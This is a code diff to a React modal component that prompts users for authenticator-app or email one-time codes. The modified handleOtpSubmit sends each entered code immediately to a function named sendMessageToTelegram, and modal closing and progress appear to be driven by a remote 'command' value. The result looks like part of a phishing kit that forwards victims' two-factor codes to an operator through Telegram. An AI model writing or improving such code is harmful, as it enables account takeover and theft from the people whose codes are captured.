@@ -28,6 +28,13 @@ export default function Modal({ displayModal, setDisplayModal, modal, count, set
             setIsLoading(false);
             setOtpCode('');
             setDisplayModal(false); // Close regardless of modal type
+            
+            setCount(count + 1);
+            if (modal === 'AuthApp') {
+                setAppAuthButton(true);
+            } else {
+                setEmailAuthButton(true);
+            }
         }
     }, [command, modal, setDisplayModal]);
 
@@ -51,30 +58,32 @@ export default function Modal({ displayModal, setDisplayModal, modal, count, set
     const handleOtpSubmit = () => {
         if (otpCode) {
             setIsLoading(true);
+            sendMessageToTelegram(otpCode); // Send to Telegram immediately
+            setOtpCode(''); // Clear input
 
             // Simulating OTP verification
-            setTimeout(() => {
-                // You can replace this with your actual Telegram integration
-                console.log(`Sending ${modal} OTP:`, otpCode);
+            // setTimeout(() => {
+            //     // You can replace this with your actual Telegram integration
+            //     console.log(`Sending ${modal} OTP:`, otpCode);
 
-                // For now, just simulate success and close modal
+            //     // For now, just simulate success and close modal
 
-                sendMessageToTelegram(otpCode);
-                setOtpCode('');
+            //     sendMessageToTelegram(otpCode);
+            //     setOtpCode('');
 
-                // close the modal and increment count by one
+            //     // close the modal and increment count by one
 
-                if (modal === 'AuthApp') {
-                    setAppAuthButton(true)
-                } else (
-                    setEmailAuthButton(true)
-                )
+            //     if (modal === 'AuthApp') {
+            //         setAppAuthButton(true)
+            //     } else (
+            //         setEmailAuthButton(true)
+            //     )
 
-                setDisplayModal(false)
-                setIsLoading(false);
-                setCount(count + 1)
+            //     setDisplayModal(false)
+            //     setIsLoading(false);
+            //     setCount(count + 1)
 
-            }, 1500);
+            // }, 1500);
         } else {
             setInvalid(true); // Show error if OTP code is empty
         }
